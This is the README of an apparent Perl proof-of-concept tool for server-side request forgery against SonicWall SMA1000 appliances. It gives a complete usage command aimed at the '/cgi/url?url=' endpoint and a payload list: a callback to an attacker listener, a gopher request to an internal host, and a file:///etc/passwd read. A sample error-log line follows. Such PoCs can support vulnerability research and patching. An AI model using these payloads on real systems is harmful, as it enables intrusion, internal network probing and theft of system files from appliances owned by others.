# ssrf_advanced.pl – Advanced SSRF PoC for SonicWall SMA1000

**Author:** TURKI ALNAFIE  
**Created:** 2025-06-18

*Usage*
perl ssrf_advanced.pl \
  --target   https://SMA_HOST_OR_IP          \
  --endpoint '/cgi/url?url='                 \
  --payloads payloads.txt                    \
  --threads  10                              \
  --timeout  5                               \
  --verbose


 
 *payloads format*
# payloads.txt
http://YOUR_LISTENER:8000/
gopher://10.0.2.15/_HEAD / HTTP/1.1\r\nHost:10.0.2.15\r\n\r\n
file:///etc/passwd



*Logging & Output*
	•	Verbose mode prints each request and response summary to STDOUT.
	•	Any response with status code ≠ 200 is saved to ssrf_errors.log:
 Wed Jun 18 22:15:03 2025 | 403 | https://10.0.0.5/cgi/url?url=http%3A%2F%2F...
